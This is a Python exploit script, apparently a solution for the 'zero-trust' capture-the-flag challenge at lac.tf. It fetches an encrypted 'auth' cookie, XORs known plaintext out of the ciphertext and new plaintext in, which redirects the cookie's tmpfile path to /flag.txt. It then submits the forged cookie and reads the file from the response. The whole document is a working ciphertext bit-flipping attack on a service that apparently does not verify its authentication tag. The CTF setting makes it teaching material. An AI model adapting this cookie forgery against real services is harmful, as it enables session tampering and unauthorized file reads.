
import base64
import requests
from urllib.parse import quote, unquote
from bs4 import BeautifulSoup

URL = "https://zero-trust.lac.tf/"

CURRENT_PLAIN = b'{"tmpfile":"/tmp/pastestore/'
WANTED_PLAIN  = b'{"tmpfile":"/flag.txt","a":"'

def main():
    print("[*] Fetching cookie")
    cookie = fetch_cookie(URL)
    iv, auth_tag, ciphertext = parse_cookie(cookie)
    print(f"[+] Cookie is:\t\t{unquote(cookie)}")
    
    print("[*] Constructing evil cookie")
    evil_ciphertext = construct_evil_ciphertext(ciphertext, CURRENT_PLAIN, WANTED_PLAIN)
    evil_cookie = construct_cookie(iv, auth_tag, evil_ciphertext)
    print(f"[+] Evil cookie is:\t{evil_cookie}")
    
    print("[*] Fetching the flag")
    flag = get_pastebin_content(URL, evil_cookie)
    print(f"[v] Flag is: {flag}")

def fetch_cookie(url):
    return requests.get(url).cookies.get('auth')

def parse_cookie(cookie):
    iv, auth_tag, ciphertext = [base64.b64decode(unquote(part)) for part in cookie.split(".")]
    return iv, auth_tag, ciphertext

def construct_evil_ciphertext(ciphertext, current_plain, wanted_plain):
    new_ciphertext = b""
    
    for i in range(len(wanted_plain)):
        encryption_stream_i = ciphertext[i] ^ current_plain[i]
        new_ciphertext += (wanted_plain[i] ^ encryption_stream_i).to_bytes(1, byteorder='big')

    rest_of_ciphertext = ciphertext[len(new_ciphertext):]
    return new_ciphertext + rest_of_ciphertext

def construct_cookie(iv, auth_tag, ciphertext):
    return ".".join([unquote(base64.b64encode(part)) for part in (iv, auth_tag, ciphertext)])

def get_pastebin_content(url, cookie=None):
    cookies = None
    if cookie:
        cookies = {"auth": cookie}

    result_text = requests.get(url, cookies=cookies).text
    soup = BeautifulSoup(result_text, 'html.parser')
    return soup.find_all(attrs={"name":"content"})[0].text

if __name__ == "__main__":
    main()
